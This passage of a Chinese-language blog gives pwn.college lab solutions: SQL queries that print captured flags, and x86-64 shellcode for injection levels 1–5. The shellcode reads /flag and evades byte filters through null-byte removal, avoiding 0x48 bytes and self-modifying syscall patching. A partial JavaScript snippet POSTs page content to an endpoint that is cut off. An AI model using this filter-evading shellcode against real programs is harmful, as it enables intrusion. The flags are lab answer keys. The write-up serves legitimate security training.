class="hljs-attr">headers</span>:&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: website_content,</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>



<h3 id="SQL-Playground"><a href="#SQL-Playground" class="headerlink" title="SQL Playground"></a>SQL Playground</h3><h4 id="1-SQL-Queries"><a href="#1-SQL-Queries" class="headerlink" title="1. SQL Queries"></a>1. SQL Queries</h4><p>简单的SQL语法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> name from sqlite_master <span class="hljs-built_in">where</span> <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;table&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;information&#x27;</span>&#125;<br>hacker@sql-playground~sql-queries:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> * from information<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;record&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;sL39JzNFAYS1b4urGcF1vDs5hcn.QX5kzN0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="2-Filtering-SQL"><a href="#2-Filtering-SQL" class="headerlink" title="2. Filtering SQL"></a>2. Filtering SQL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-sql:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> info from repository <span class="hljs-built_in">where</span> info like <span class="hljs-string">&#x27;%pwn%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;info&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;UIysK2dWKY3qPB4nHgeDwWXQnHb.QXwADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="3-Choosing-Columns"><a href="#3-Choosing-Columns" class="headerlink" title="3. Choosing Columns"></a>3. Choosing Columns</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql <br>sql&gt; SELECT sql FROM sqlite_master WHERE <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;table&#x27;</span> AND name = <span class="hljs-string">&#x27;resources&#x27;</span>;<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;sql&#x27;</span>: <span class="hljs-string">&#x27;CREATE TABLE resources(flag_tag,datum)&#x27;</span>&#125;<br>hacker@sql-playground~choosing-columns:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> datum from resources <span class="hljs-built_in">where</span> datum like <span class="hljs-string">&quot;%pwn%&quot;</span>;<br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;datum&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;k6URsZ8-uBwi_TNBBVNFI7zEreQ.QXxADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="4-Exclusionary-Filtering"><a href="#4-Exclusionary-Filtering" class="headerlink" title="4. Exclusionary Filtering"></a>4. Exclusionary Filtering</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~exclusionary-filtering:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> secret from data <span class="hljs-built_in">where</span> secret like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;secret&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;AcDNrhXELmHNhramheE64AkS0AB.QXyADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="5-Filtering-Strings"><a href="#5-Filtering-Strings" class="headerlink" title="5. Filtering Strings"></a>5. Filtering Strings</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-strings:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> record from secrets <span class="hljs-built_in">where</span> record like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;record&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;ctyoxv05RHMSQR6B2ybT7siWQZs.QXzADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="6-Filtering-on-Expressions"><a href="#6-Filtering-on-Expressions" class="headerlink" title="6. Filtering on Expressions"></a>6. Filtering on Expressions</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@sql-playground~filtering-on-expressions:~/Desktop$ /challenge/sql <br>sql&gt; <span class="hljs-keyword">select</span> detail from items <span class="hljs-built_in">where</span> detail like <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br>Got 1 rows.<br>- &#123;<span class="hljs-string">&#x27;detail&#x27;</span>: <span class="hljs-string">&#x27;pwn.college&#123;QwM7-oEhh9lTAvkfmOVVXEUbCj3.QX0ADO0EDLxYTN1YzW&#125;&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="7-SELECTING-Expressions"><a href="#7-SELECTING-Expressions" class="headerlink" title="7. SELECTING Expressions"></a>7. SELECTING Expressions</h4><p>用substr限制5个字符的输出，然后一点点拼接出flag。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> substr(payload, <span class="hljs-number">56</span>, <span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> payloads <span class="hljs-keyword">where</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%pwn.college%&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="8-Composite-Conditions"><a href="#8-Composite-Conditions" class="headerlink" title="8. Composite Conditions"></a>8. Composite Conditions</h4><p>记得使用cat查看<code>/challenge/sql</code>的源码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> payload <span class="hljs-keyword">from</span> entries <span class="hljs-keyword">where</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;pwn.college&#123;%&#x27;</span> <span class="hljs-keyword">and</span> payload <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#125;&#x27;</span> <span class="hljs-keyword">and</span> flag_tag <span class="hljs-operator">=</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure>

<h4 id="9-Reaching-Your-LIMITs"><a href="#9-Reaching-Your-LIMITs" class="headerlink" title="9. Reaching Your LIMITs"></a>9. Reaching Your LIMITs</h4><p><code>limit</code>的应用，因为limit的特性，再结合源码。因此limit 1时，输出的就是正确的flag。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> content <span class="hljs-keyword">from</span> notes <span class="hljs-keyword">where</span> content <span class="hljs-keyword">like</span> &quot;pwn.college&#123;%&quot; <span class="hljs-keyword">and</span> content <span class="hljs-keyword">like</span> &quot;%&#125;&quot; limit <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h4 id="10-Querying-Metadata"><a href="#10-Querying-Metadata" class="headerlink" title="10. Querying Metadata"></a>10. Querying Metadata</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;table&#x27;</span><br>Got <span class="hljs-number">1</span> rows.<br><span class="hljs-operator">-</span> &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;NAtlxoGT&#x27;</span>&#125;<br><span class="hljs-keyword">sql</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> text <span class="hljs-keyword">from</span> NAtlxoGT<br></code></pre></td></tr></table></figure>



<h1 id="Core-Material"><a href="#Core-Material" class="headerlink" title="Core Material"></a>Core Material</h1><h2 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h2><p>TO DO !!!</p>
<h2 id="Program-Security"><a href="#Program-Security" class="headerlink" title="Program Security"></a>Program Security</h2><h3 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h3><p>这个模块，使用的不是as和ld来汇编链接了。而是使用gcc编译器。</p>
<p>gcc是更高级的编译器，更方便，gcc可以自动处理汇编代码。可以根据文件的后缀名自动选择相应的编译器和链接器。gcc可以自动链接标准库以及你指定的其他库。</p>
<p>as+ld更底层，as汇编器将汇编代码转换为目标代码。目标代码是机器可以理解的二进制代码，但还没有链接成可执行文件。ld是GNU链接器，它将多个目标代码文件链接成可执行文件。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ gcc -nostdlib -static <span class="hljs-keyword">shellcode.s </span>-o <span class="hljs-keyword">shellcode-elf </span><br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>nostdlib</code>：不链接标准C库(libc)。这意味着不依赖于标准库中的任何函数，例如<code>prinft</code>，<code>malloc</code>等。</p>
<p><code>-static</code>：这个选项告诉编译器静态链接所有的库函数。所有的库函数代码将被直接包含到最终的可执行文件中，而不是通过动态链接的方式在运行时加载。提高程序可移植性。</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ objcopy <span class="hljs-params">--dump-section</span> <span class="hljs-string">.text=shellcode-raw</span> shellcode-elf<br></code></pre></td></tr></table></figure>

<blockquote>
<p>为什么需要objcopy这个命令呢？</p>
<p>objcopy将编译出来的shellcode-elf中单纯代码部分的机器码给提取出来。如果不这样做的话，gcc编译出来的可执行文件会有其他的机器码，用这个可执行文件作为shellcode传给程序的话，就不能直接起作用了，有其他杂项。</p>
</blockquote>
<h4 id="level1-2"><a href="#level1-2" class="headerlink" title="level1"></a>level1</h4><p>目的是通过shellcode，读取flag，并将其打印在屏幕上。OK，使用open和sendfile系统调用即可。</p>
<p><code>sys_sendfile(int out_fd,int in_fd,off_t *offset,size_t count)</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>	<span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span>							# 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>

<p>其实，也可以使用read,write系统调用，但是更复杂，需要处理字符串。</p>
<h4 id="level2-2"><a href="#level2-2" class="headerlink" title="level2"></a>level2</h4><p>这关简单，用到之前的技巧，生成0x800个nop即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x800</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>这一关，需要shellcode中没有空字节。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mov</span> rbx, <span class="hljs-number">0</span>x67616c662f		# bb48    <span class="hljs-number">662</span>f    <span class="hljs-number">616</span>c    <span class="hljs-number">0067</span>    <span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure>

<p>第一句就会有很多空字节，那么可以这么写：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br><span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br># 66bb    616c    <span class="hljs-number">4867</span>    e3c1    b308    532f<br></code></pre></td></tr></table></figure>

<p><code>hexdump -x ./shellcode-raw</code>来查看shellcode的机器码。</p>
<p>因此，其他的也相应进行替换。最终exp如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0x67616c66</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x2f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0xe8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4><p>This challenge requires that your shellcode have no H bytes! 不给有H字节。也就是<code>48</code></p>
<p>那就将所有的内容都换成<code>push/pop</code>即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x67616c662f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x616c662f</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0x67</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x2</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">r10</span><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">40</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level5-2"><a href="#level5-2" class="headerlink" title="level5"></a>level5</h4><p>不让用<code>syscall(0x0f05)</code>，<code>sysenter(0x0f34)</code>和<code>int(0x80cd)</code></p>
<p>题目提示是：绕过的一种方法是让shellcode修改自己，以便在运行时插入<code>syscall</code>指令。</p>
<blockquote>
<p>那么实际操作起来就是，将syscall的0x0f05成为一个字节值，即将0x0e05作为一个字节存储于代码段中，然后通过inc指令加1，使得第一个字节0e变成0f，并执行这个机器码，成功调用syscall即可。</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span>							# 标准输出<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> 